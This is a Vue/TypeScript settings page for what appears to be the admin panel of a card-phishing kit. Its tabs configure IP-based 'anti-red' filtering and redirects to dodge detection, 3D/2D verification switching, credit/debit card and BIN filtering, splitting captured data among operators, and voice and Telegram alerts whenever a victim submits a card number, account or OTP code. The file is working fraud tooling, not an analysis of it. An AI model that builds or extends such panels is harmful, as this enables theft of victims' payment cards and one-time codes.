<script setup lang="ts">
const activeTab = ref('backstage')

// 后台设置配置
interface BackstageConfig {
  apiKeys: string
  apiKeysRemainingCredits: number
  redirectUrl: string
  unattended: string // '开启3D验证' | '关闭3D验证'
  cardTypeFilter: string // '关闭' | '只要C卡' | '只要D卡'
  allowDuplicateCard: string // '允许' | '拒绝'
  dataBackup: string // '关闭' | '开启'
}

const backstageConfig = ref<BackstageConfig>({
  apiKeys: '',
  apiKeysRemainingCredits: 0,
  redirectUrl: '',
  unattended: '开启3D验证',
  cardTypeFilter: '关闭',
  allowDuplicateCard: '允许',
  dataBackup: '关闭',
})

// 分流控制配置
interface TrafficControlConfig {
  systemRoundRobin: string // '开启系统轮询分流' | '关闭系统轮询分流'
}

const trafficControlConfig = ref<TrafficControlConfig>({
  systemRoundRobin: '开启系统轮询分流',
})

// 卡头设置配置
interface CardHeaderConfig {
  autoRejectBins: string
}

interface CardHeaderItem {
  id: string
  bin: string
  remark: string
  color: string
  createTime: string
  updateTime: string
}

const cardHeaderConfig = ref<CardHeaderConfig>({
  autoRejectBins: '',
})

const cardHeaders = ref<CardHeaderItem[]>([])
const selectedCardHeaders = ref<string[]>([])
const cardHeaderSearch = ref('')
const cardHeaderItemsPerPage = ref(10)
const cardHeaderPage = ref(1)
const cardHeaderTotalItems = ref(0)

const cardHeaderHeaders = [
  { title: '卡头', key: 'bin' },
  { title: '备注', key: 'remark' },
  { title: '颜色', key: 'color' },
  { title: '创建时间', key: 'createTime' },
  { title: '更新时间', key: 'updateTime' },
  { title: '操作', key: 'actions', sortable: false },
]

// Telegram配置
interface TelegramConfig {
  robotToken: string
  userIdOrGroupId: string
}

const telegramConfig = ref<TelegramConfig>({
  robotToken: '',
  userIdOrGroupId: '',
})

// 通知配置
interface NotificationConfig {
  voiceReminder: {
    userEnterHomepage: boolean
    userSubmitCard: boolean
    userSubmitOTP: boolean
    backendLogin: boolean
  }
  telegramPush: {
    userSubmitAccount: boolean
    userSubmitCard: boolean
    userSubmitOTP: boolean
    backendLogin: boolean
  }
  customVoice: {
    userInputCard: string
    userSubmitCard: string
    userInputAccount: string
    userSubmitAccount: string
    otpVerification: string
  }
}

const notificationConfig = ref<NotificationConfig>({
  voiceReminder: {
    userEnterHomepage: true,
    userSubmitCard: true,
    userSubmitOTP: true,
    backendLogin: true,
  },
  telegramPush: {
    userSubmitAccount: false,
    userSubmitCard: true,
    userSubmitOTP: true,
    backendLogin: true,
  },
  customVoice: {
    userInputCard: '',
    userSubmitCard: '',
    userInputAccount: '',
    userSubmitAccount: '',
    otpVerification: '',
  },
})

const saveConfig = () => {
  // 根据当前Tab保存对应配置
  // TODO: 实现保存逻辑
  console.log('保存配置', { activeTab: activeTab.value })
}

const resetConfig = () => {
  // 根据当前Tab重置对应配置
  if (activeTab.value === 'backstage') {
    backstageConfig.value = {
      apiKeys: '',
      apiKeysRemainingCredits: 0,
      redirectUrl: '',
      unattended: '开启3D验证',
      cardTypeFilter: '关闭',
      allowDuplicateCard: '允许',
      dataBackup: '关闭',
    }
  }
  else if (activeTab.value === 'traffic') {
    trafficControlConfig.value = {
      systemRoundRobin: '开启系统轮询分流',
    }
  }
  else if (activeTab.value === 'cardHeader') {
    cardHeaderConfig.value = {
      autoRejectBins: '',
    }
    cardHeaders.value = []
    cardHeaderSearch.value = ''
  }
  else if (activeTab.value === 'telegram') {
    telegramConfig.value = {
      robotToken: '',
      userIdOrGroupId: '',
    }
  }
  else if (activeTab.value === 'notification') {
    notificationConfig.value = {
      voiceReminder: {
        userEnterHomepage: true,
        userSubmitCard: true,
        userSubmitOTP: true,
        backendLogin: true,
      },
      telegramPush: {
        userSubmitAccount: false,
        userSubmitCard: true,
        userSubmitOTP: true,
        backendLogin: true,
      },
      customVoice: {
        userInputCard: '',
        userSubmitCard: '',
        userInputAccount: '',
        userSubmitAccount: '',
        otpVerification: '',
      },
    }
  }

  // TODO: 实现其他Tab的重置逻辑
}

const configContent = ref('')

const exportConfig = () => {
  // 导出配置逻辑
  const configData = {
    backstage: backstageConfig.value,
    traffic: trafficControlConfig.value,
    telegram: telegramConfig.value,
    notification: notificationConfig.value,
    cardHeader: cardHeaderConfig.value,
  }

  // 将配置数据转换为base64编码的JSON字符串
  const jsonString = JSON.stringify(configData, null, 2)
  configContent.value = btoa(unescape(encodeURIComponent(jsonString)))
}

const importConfig = () => {
  // 导入配置逻辑
  try {
    if (!configContent.value) {
      console.error('配置内容为空')
      return
    }

    const jsonString = decodeURIComponent(escape(atob(configContent.value)))
    const configData = JSON.parse(jsonString)

    if (configData.backstage)
      backstageConfig.value = configData.backstage

    if (configData.traffic)
      trafficControlConfig.value = configData.traffic

    if (configData.telegram)
      telegramConfig.value = configData.telegram

    if (configData.notification)
      notificationConfig.value = configData.notification

    if (configData.cardHeader)
      cardHeaderConfig.value = configData.cardHeader
  }
  catch (error) {
    console.error('导入配置失败', error)
  }
}

// 初始化时导出当前配置
onMounted(() => {
  exportConfig()
})
</script>

<template>
  <VCard class="system-config-card">
    <VCardItem class="card-header">
      <VCardTitle class="card-title">
        系统配置
      </VCardTitle>
    </VCardItem>
    <VDivider />

    <!-- Tab切换 -->
    <VTabs
      v-model="activeTab"
      class="config-tabs"
    >
      <VTab value="backstage">
        后台设置
      </VTab>
      <VTab value="traffic">
        分流控制
      </VTab>
      <VTab value="cardHeader">
        卡头设置
      </VTab>
      <VTab value="telegram">
        Telegram
      </VTab>
      <VTab value="notification">
        通知
      </VTab>
      <VTab value="importExport">
        导入导出配置
      </VTab>
    </VTabs>

    <VDivider />

    <VCardText class="card-content">
      <!-- 后台设置Tab -->
      <VWindow v-model="activeTab">
        <VWindowItem value="backstage">
          <VRow class="config-row">
            <!-- 防红配置卡片 -->
            <VCol
              cols="12"
              md="6"
            >
              <VCard class="config-section-card">
                <VCardText>
                  <h6 class="section-title mb-3">
                    防红配置
                  </h6>
                  <p class="section-description mb-3">
                    前往
                    <a
                      href="https://dashboard.ipregistry.co/signup"
                      target="_blank"
                      rel="noopener noreferrer"
                    >
                      👉 https://dashboard.ipregistry.co/signup
                    </a>
                    申请免费的 API 密钥
                    <a
                      href="javascript:;"
                      @click.prevent
                    >
                      (👉点我查看步骤②)
                    </a>
                  </p>
                  <VTextField
                    v-model="backstageConfig.apiKeys"
                    :label="`API Keys （剩余积分: ${backstageConfig.apiKeysRemainingCredits}）`"
                    variant="outlined"
                    density="compact"
                    hide-details
                    class="config-input mb-3"
                  />
                  <VTextField
                    v-model="backstageConfig.redirectUrl"
                    label="拦截后跳转地址（如果前台已设置拦截跳转，则优先采用前台设置）"
                    placeholder="例如：https://xxx.com"
                    variant="outlined"
                    density="compact"
                    hide-details
                    class="config-input"
                  />
                </VCardText>
              </VCard>
            </VCol>

            <!-- 无人值守卡片 -->
            <VCol
              cols="12"
              md="6"
            >
              <VCard class="config-section-card">
                <VCardText>
                  <h6 class="section-title mb-3">
                    无人值守
                  </h6>
                  <p class="section-description mb-3">
                    3D/2D(无人值守) 验证切换，2D验证时的支付状态、失败次数等等
                  </p>
                  <VSelect
                    v-model="backstageConfig.unattended"
                    :items="[
                      { title: '开启3D验证', value: '开启3D验证' },
                      { title: '关闭3D验证', value: '关闭3D验证' },
                    ]"
                    label="同步控制 （2D/3D验证）"
                    variant="outlined"
                    density="compact"
                    hide-details
                    class="config-input"
                  />
                </VCardText>
              </VCard>
            </VCol>

            <!-- 按卡类型筛选卡片 -->
            <VCol
              cols="12"
              md="6"
            >
              <VCard class="config-section-card">
                <VCardText>
                  <h6 class="section-title mb-3">
                    按卡类型筛选
                  </h6>
                  <p class="section-description mb-3">
                    是否按卡类型 C/D 筛选，是否允许重复卡号提交等等功能
                  </p>
                  <VSelect
                    v-model="backstageConfig.cardTypeFilter"
                    :items="[
                      { title: '关闭', value: '关闭' },
                      { title: '只要C卡', value: '只要C卡' },
                      { title: '只要D卡', value: '只要D卡' },
                    ]"
                    label="按卡类型筛选"
                    variant="outlined"
                    density="compact"
                    hide-details
                    class="config-input mb-3"
                  />
                  <VSelect
                    v-model="backstageConfig.allowDuplicateCard"
                    :items="[
                      { title: '允许', value: '允许' },
                      { title: '拒绝', value: '拒绝' },
                    ]"
                    label="重复卡号提交（用户提交重复卡号时自动拒绝）"
                    variant="outlined"
                    density="compact"
                    hide-details
                    class="config-input"
                  />
                </VCardText>
              </VCard>
            </VCol>

            <!-- 数据备份卡片 -->
            <VCol
              cols="12"
              md="6"
            >
              <VCard class="config-section-card">
                <VCardText>
                  <h6 class="section-title mb-3">
                    数据备份
                  </h6>
                  <p class="section-description mb-3">
                    需要先配置 Telegram 机器人才能开启数据备份
                  </p>
                  <VSelect
                    v-model="backstageConfig.dataBackup"
                    :items="[
                      { title: '关闭', value: '关闭' },
                      { title: '开启', value: '开启' },
                    ]"
                    label="数据备份"
                    variant="outlined"
                    density="compact"
                    hide-details
                    class="config-input"
                  />
                </VCardText>
              </VCard>
            </VCol>
          </VRow>
          <VRow class="config-row mt-4">
            <VCol
              cols="12"
              class="d-flex gap-3 justify-end"
            >
              <VBtn
                variant="outlined"
                size="default"
                @click="resetConfig"
              >
                重置
              </VBtn>
              <VBtn
                color="primary"
                variant="elevated"
                size="default"
                @click="saveConfig"
              >
                保存
              </VBtn>
            </VCol>
          </VRow>
        </VWindowItem>

        <!-- 分流控制Tab -->
        <VWindowItem value="traffic">
          <VRow class="config-row">
            <VCol
              cols="12"
              class="section-header"
            >
              <h6 class="section-title">
                分流开关
              </h6>
            </VCol>
            <VCol
              cols="12"
              class="config-field"
            >
              <div class="section-description">
                <p>说明：</p>
                <p>超级管理员可以看到全部分流</p>
                <p>其他账号轮询分流 (可在系统设置里面关闭)</p>
                <p>注意：游客不分流，如需分流功能，请创建一个新的角色，再分配给对应账号</p>
                <p>关闭系统轮询分流，则除游客以外账号都能看到所有数据</p>
              </div>
            </VCol>
            <VCol
              cols="12"
              class="config-field"
            >
              <VSelect
                v-model="trafficControlConfig.systemRoundRobin"
                :items="[
                  { title: '开启系统轮询分流', value: '开启系统轮询分流' },
                  { title: '关闭系统轮询分流', value: '关闭系统轮询分流' },
                ]"
                label="系统轮询分流"
                variant="outlined"
                density="compact"
                hide-details
                class="config-input"
              />
            </VCol>
          </VRow>
          <VRow class="config-row">
            <VCol
              cols="12"
              class="d-flex gap-3 justify-end"
            >
              <VBtn
                variant="outlined"
                size="default"
                @click="resetConfig"
              >
                重置
              </VBtn>
              <VBtn
                color="primary"
                variant="elevated"
                size="default"
                @click="saveConfig"
              >
                保存
              </VBtn>
            </VCol>
          </VRow>
        </VWindowItem>

        <!-- 卡头设置Tab -->
        <VWindowItem value="cardHeader">
          <VRow class="config-row">
            <!-- 自动拒绝的卡头卡片 -->
            <VCol
              cols="12"
              md="6"
            >
              <VCard class="config-section-card">
                <VCardText>
                  <h6 class="section-title mb-3">
                    自动拒绝的卡头
                  </h6>
                  <p class="section-description mb-3">
                    拒绝的卡头会显示红色，格式：440393|491637|544064
                  </p>
                  <VTextField
                    v-model="cardHeaderConfig.autoRejectBins"
                    placeholder="例如: 440393|413331|546714"
                    variant="outlined"
                    density="compact"
                    hide-details
                    class="config-input mb-3"
                  />
                  <div class="d-flex gap-3 justify-end">
                    <VBtn
                      variant="outlined"
                      size="default"
                      @click="resetConfig"
                    >
                      重置
                    </VBtn>
                    <VBtn
                      color="primary"
                      variant="elevated"
                      size="default"
                      @click="saveConfig"
                    >
                      保存
                    </VBtn>
                  </div>
                </VCardText>
              </VCard>
            </VCol>

            <!-- 卡头备注卡片 -->
            <VCol
              cols="12"
              md="6"
            >
              <VCard class="config-section-card">
                <VCardText>
                  <h6 class="section-title mb-3">
                    卡头备注
                  </h6>
                  <div class="d-flex align-center justify-space-between flex-wrap gap-4 mb-4">
                    <VSelect
                      v-model="cardHeaderItemsPerPage"
                      :items="[10, 20, 50, 100]"
                      variant="outlined"
                      density="compact"
                      hide-details
                      style="width: 90px;"
                    />
                    <div class="d-flex gap-2 flex-wrap">
                      <VTextField
                        v-model="cardHeaderSearch"
                        placeholder="Search BIN"
                        variant="outlined"
                        density="compact"
                        hide-details
                        style="width: 200px;"
                      />
                      <VBtn
                        color="primary"
                        variant="elevated"
                        size="default"
                      >
                        <VIcon
                          icon="ri-add-line"
                          start
                          size="20"
                        />
                        新增卡头
                      </VBtn>
                      <VBtn
                        variant="outlined"
                        size="default"
                      >
                        <VIcon
                          icon="ri-upload-line"
                          start
                          size="20"
                        />
                        批量导入
                      </VBtn>
                      <VBtn
                        variant="outlined"
                        size="default"
                      >
                        <VIcon
                          icon="ri-download-line"
                          start
                          size="20"
                        />
                        导出
                      </VBtn>
                      <VBtn
                        color="error"
                        variant="outlined"
                        size="default"
                      >
                        <VIcon
                          icon="ri-delete-bin-line"
                          start
                          size="20"
                        />
                        一键清空
                      </VBtn>
                    </div>
                  </div>
                  <VDataTable
                    v-model="selectedCardHeaders"
                    :headers="cardHeaderHeaders"
                    :items="cardHeaders"
                    :items-per-page="cardHeaderItemsPerPage"
                    :page="cardHeaderPage"
                    show-select
                    class="text-no-wrap"
                  >
                    <template #item.color="{ item }">
                      <VChip
                        :color="item.color || 'default'"
                        size="small"
                      >
                        {{ item.color || '-' }}
                      </VChip>
                    </template>
                    <template #item.actions="{ item }">
                      <IconBtn
                        size="small"
                        class="me-2"
                      >
                        <VIcon
                          icon="ri-edit-line"
                          size="20"
                        />
                      </IconBtn>
                      <IconBtn
                        size="small"
                        color="error"
                      >
                        <VIcon
                          icon="ri-delete-bin-line"
                          size="20"
                        />
                      </IconBtn>
                    </template>
                    <template #no-data>
                      <div class="text-center py-4">
                        <p class="text-body-2 text-disabled">
                          暂无数据
                        </p>
                      </div>
                    </template>
                    <template #bottom>
                      <div class="d-flex align-center justify-space-between pa-4">
                        <div class="text-body-2">
                          Showing {{ (cardHeaderPage - 1) * cardHeaderItemsPerPage + 1 }} to {{ Math.min(cardHeaderPage * cardHeaderItemsPerPage, cardHeaderTotalItems) }} of {{ cardHeaderTotalItems }} entries
                        </div>
                        <VPagination
                          v-model="cardHeaderPage"
                          :length="Math.ceil(cardHeaderTotalItems / cardHeaderItemsPerPage)"
                          :total-visible="5"
                          density="comfortable"
                        />
                      </div>
                    </template>
                  </VDataTable>
                </VCardText>
              </VCard>
            </VCol>
          </VRow>
        </VWindowItem>

        <!-- Telegram Tab -->
        <VWindowItem value="telegram">
          <VRow class="config-row">
            <VCol
              cols="12"
              class="config-field"
            >
              <VTextField
                v-model="telegramConfig.robotToken"
                label="Robot Token"
                variant="outlined"
                density="compact"
                hide-details
                class="config-input"
              />
            </VCol>
            <VCol
              cols="12"
              class="config-field"
            >
              <VTextField
                v-model="telegramConfig.userIdOrGroupId"
                label="用户ID或群组ID"
                variant="outlined"
                density="compact"
                hide-details
                class="config-input"
              />
            </VCol>
            <VCol
              cols="12"
              class="config-field"
            >
              <p class="section-description">
                <a
                  href="https://zhuanlan.zhihu.com/p/602213485"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  👉 如何获取获取Robot Token，用户ID或群组ID
                </a>
              </p>
              <p class="section-description">
                👉 设置成功后机器人会给你推送一条成功的消息
              </p>
            </VCol>
            <VCol
              cols="12"
              class="config-field"
            >
              <div class="d-flex gap-3 justify-end">
                <VBtn
                  variant="outlined"
                  size="default"
                  @click="resetConfig"
                >
                  重置
                </VBtn>
                <VBtn
                  color="primary"
                  variant="elevated"
                  size="default"
                  @click="saveConfig"
                >
                  保存
                </VBtn>
              </div>
            </VCol>
          </VRow>
        </VWindowItem>

        <!-- 通知Tab -->
        <VWindowItem value="notification">
          <VRow class="config-row">
            <!-- 后台语音提醒卡片 -->
            <VCol
              cols="12"
              md="4"
            >
              <VCard class="config-section-card">
                <VCardText>
                  <h6 class="section-title mb-3">
                    后台语音提醒
                  </h6>
                  <p class="section-description mb-3">
                    后台语音提醒功能控制
                  </p>
                  <VList>
                    <VListItem>
                      <VListItemTitle>用户进入首页</VListItemTitle>
                      <template #append>
                        <VCheckbox
                          v-model="notificationConfig.voiceReminder.userEnterHomepage"
                          density="compact"
                          hide-details
                        />
                      </template>
                    </VListItem>
                    <VListItem>
                      <VListItemTitle>用户提交卡号</VListItemTitle>
                      <template #append>
                        <VCheckbox
                          v-model="notificationConfig.voiceReminder.userSubmitCard"
                          density="compact"
                          hide-details
                        />
                      </template>
                    </VListItem>
                    <VListItem>
                      <VListItemTitle>用户提交OTP</VListItemTitle>
                      <template #append>
                        <VCheckbox
                          v-model="notificationConfig.voiceReminder.userSubmitOTP"
                          density="compact"
                          hide-details
                        />
                      </template>
                    </VListItem>
                    <VListItem>
                      <VListItemTitle>后台系统登录</VListItemTitle>
                      <template #append>
                        <VCheckbox
                          v-model="notificationConfig.voiceReminder.backendLogin"
                          density="compact"
                          hide-details
                        />
                      </template>
                    </VListItem>
                  </VList>
                </VCardText>
              </VCard>
            </VCol>

            <!-- Telegram 推送卡片 -->
            <VCol
              cols="12"
              md="4"
            >
              <VCard class="config-section-card">
                <VCardText>
                  <h6 class="section-title mb-3">
                    Telegram 推送
                  </h6>
                  <p class="section-description mb-3">
                    需要配置Telegram
                  </p>
                  <VList>
                    <VListItem>
                      <VListItemTitle>用户提交账号</VListItemTitle>
                      <template #append>
                        <VCheckbox
                          v-model="notificationConfig.telegramPush.userSubmitAccount"
                          density="compact"
                          hide-details
                        />
                      </template>
                    </VListItem>
                    <VListItem>
                      <VListItemTitle>用户提交卡号</VListItemTitle>
                      <template #append>
                        <VCheckbox
                          v-model="notificationConfig.telegramPush.userSubmitCard"
                          density="compact"
                          hide-details
                        />
                      </template>
                    </VListItem>
                    <VListItem>
                      <VListItemTitle>用户提交OTP</VListItemTitle>
                      <template #append>
                        <VCheckbox
                          v-model="notificationConfig.telegramPush.userSubmitOTP"
                          density="compact"
                          hide-details
                        />
                      </template>
                    </VListItem>
                    <VListItem>
                      <VListItemTitle>后台系统登录</VListItemTitle>
                      <template #append>
                        <VCheckbox
                          v-model="notificationConfig.telegramPush.backendLogin"
                          density="compact"
                          hide-details
                        />
                      </template>
                    </VListItem>
                  </VList>
                </VCardText>
              </VCard>
            </VCol>

            <!-- 自定义语音通知卡片 -->
            <VCol
              cols="12"
              md="4"
            >
              <VCard class="config-section-card">
                <VCardText>
                  <h6 class="section-title mb-3">
                    自定义语音通知
                  </h6>
                  <VCard
                    v-for="(item, index) in [
                      { key: 'userInputCard', title: '用户输入卡号', desc: '用户开始输入卡号时播放' },
                      { key: 'userSubmitCard', title: '用户提交卡号', desc: '用户提交卡号后播放' },
                      { key: 'userInputAccount', title: '用户输入账号', desc: '用户开始输入账号时播放' },
                      { key: 'userSubmitAccount', title: '用户提交账号', desc: '用户提交账号后播放' },
                      { key: 'otpVerification', title: 'OTP验证码', desc: '用户提交OTP验证码时播放' },
                    ]"
                    :key="index"
                    class="mb-3"
                    variant="outlined"
                  >
                    <VCardText class="pa-3">
                      <div class="d-flex align-center justify-space-between">
                        <div>
                          <h6 class="text-h6 mb-1">
                            {{ item.title }}
                          </h6>
                          <p class="text-body-2 text-disabled mb-0">
                            {{ item.desc }}
                          </p>
                        </div>
                        <div class="d-flex gap-2">
                          <VBtn
                            variant="outlined"
                            size="small"
                          >
                            使用默认
                          </VBtn>
                          <VBtn
                            color="primary"
                            variant="elevated"
                            size="small"
                          >
                            <VIcon
                              icon="ri-upload-line"
                              start
                              size="18"
                            />
                            上传语音
                          </VBtn>
                        </div>
                      </div>
                    </VCardText>
                  </VCard>
                  <VAlert
                    type="info"
                    variant="tonal"
                    class="mt-3"
                  >
                    <VAlertTitle>使用说明</VAlertTitle>
                    <div>
                      <a
                        href="https://ttsmaker.com/zh-hk"
                        target="_blank"
                        rel="noopener noreferrer"
                      >
                        (免费语音转换网站)
                      </a>
                      <ul class="mt-2 mb-0">
                        <li>支持 MP3、WAV、OGG、M4A 格式的音频文件</li>
                        <li>文件大小不超过 5MB</li>
                        <li>建议录制清晰、简洁的语音提示</li>
                      </ul>
                    </div>
                  </VAlert>
                </VCardText>
              </VCard>
            </VCol>
          </VRow>
        </VWindowItem>

        <!-- 导入导出配置Tab -->
        <VWindowItem value="importExport">
          <VRow class="config-row">
            <VCol
              cols="12"
              class="section-header"
            >
              <h6 class="section-title">
                导入/导出系统设置配置
              </h6>
            </VCol>
            <VCol
              cols="12"
              class="config-field"
            >
              <p class="section-description">
                复制和粘贴下面输入框内容，可以分享当前配置到其它地方使用
              </p>
            </VCol>
            <VCol
              cols="12"
              class="config-field"
            >
              <VTextarea
                v-model="configContent"
                placeholder="请复制粘贴配置文件内容到当前输入框"
                variant="outlined"
                density="compact"
                rows="10"
                hide-details
                class="config-input"
              />
            </VCol>
            <VCol
              cols="12"
              class="config-field"
            >
              <div class="d-flex gap-3 justify-end">
                <VBtn
                  variant="outlined"
                  size="default"
                  @click="exportConfig"
                >
                  导出
                </VBtn>
                <VBtn
                  color="primary"
                  variant="elevated"
                  size="default"
                  @click="importConfig"
                >
                  保存
                </VBtn>
              </div>
            </VCol>
          </VRow>
        </VWindowItem>
      </VWindow>
    </VCardText>
  </VCard>
</template>

<style lang="scss" scoped>
.system-config-card {
  border-radius: 0.5rem;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);

  .card-header {
    padding: 1.25rem 1.5rem;

    .card-title {
      font-size: 1.125rem;
      font-weight: 500;
      color: rgba(var(--v-theme-on-surface), var(--v-high-emphasis-opacity));
    }

    .header-actions {
      display: flex;
      align-items: center;
      gap: 0.75rem;

      .action-btn {
        font-size: 0.875rem;
        font-weight: 500;
        padding-inline: 1rem;
        padding-block: 0.625rem;
        border-radius: 0.375rem;
        min-width: auto;
        transition: all 0.2s ease-in-out;

        &.save-btn {
          &:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.12);
          }
        }
      }
    }
  }

  .config-tabs {
    :deep(.v-tab) {
      font-size: 0.875rem;
      font-weight: 500;
      text-transform: none;
      min-width: 120px;
    }
  }

  .card-content {
    padding: 1.5rem;

    .config-row {
      .section-header {
        margin-block-start: 1rem;
        margin-block-end: 0.5rem;

        .section-title {
          font-size: 1rem;
          font-weight: 500;
          color: rgba(var(--v-theme-on-surface), var(--v-high-emphasis-opacity));
          margin: 0;
        }
      }

      .section-description {
        font-size: 0.875rem;
        color: rgba(var(--v-theme-on-surface), var(--v-medium-emphasis-opacity));
        margin: 0 0 0.75rem 0;
        line-height: 1.5;

        p {
          margin: 0.25rem 0;
        }

        a {
          color: rgb(var(--v-theme-primary));
          text-decoration: none;

          &:hover {
            text-decoration: underline;
          }
        }
      }


      .config-field {
        margin-block-end: 0.75rem;

        .config-input {
          :deep(.v-field) {
            font-size: 0.875rem;
          }

          :deep(.v-label) {
            font-size: 0.875rem;
          }
        }
      }

      .config-section-card {
        border-radius: 0.5rem;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
        height: 100%;

        .section-title {
          font-size: 1rem;
          font-weight: 500;
          color: rgba(var(--v-theme-on-surface), var(--v-high-emphasis-opacity));
          margin: 0;
        }

        .section-description {
          font-size: 0.875rem;
          color: rgba(var(--v-theme-on-surface), var(--v-medium-emphasis-opacity));
          line-height: 1.5;
          margin: 0;

          a {
            color: rgb(var(--v-theme-primary));
            text-decoration: none;

            &:hover {
              text-decoration: underline;
            }
          }
        }

        .config-input {
          :deep(.v-field) {
            font-size: 0.875rem;
          }

          :deep(.v-label) {
            font-size: 0.875rem;
          }
        }
      }

      .switch-card-col {
        margin-block-end: 1rem;
      }

      .empty-state-col {
        margin-block: 2rem;
      }

      .empty-state {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        padding-block: 4rem;
        text-align: center;

        .empty-text {
          font-size: 0.875rem;
          color: rgba(var(--v-theme-on-surface), var(--v-medium-emphasis-opacity));
          margin: 0;
        }
      }

      .switch-card {
        border-radius: 0.5rem;
        box-shadow: 0 1px 4px rgba(0, 0, 0, 0.08);
        transition: box-shadow 0.2s ease-in-out;

        &:hover {
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.12);
        }

        .switch-card-content {
          padding: 1rem 1.25rem;

          .switch-info {
            flex: 1;
            min-width: 0;

            .switch-title {
              font-size: 0.875rem;
              font-weight: 500;
              color: rgba(var(--v-theme-on-surface), var(--v-high-emphasis-opacity));
              margin-block-end: 0.25rem;
            }

            .switch-description {
              font-size: 0.8125rem;
              color: rgba(var(--v-theme-on-surface), var(--v-medium-emphasis-opacity));
            }
          }

          .switch-control {
            margin-inline-start: 1rem;
          }
        }
      }
    }
  }
}
</style>
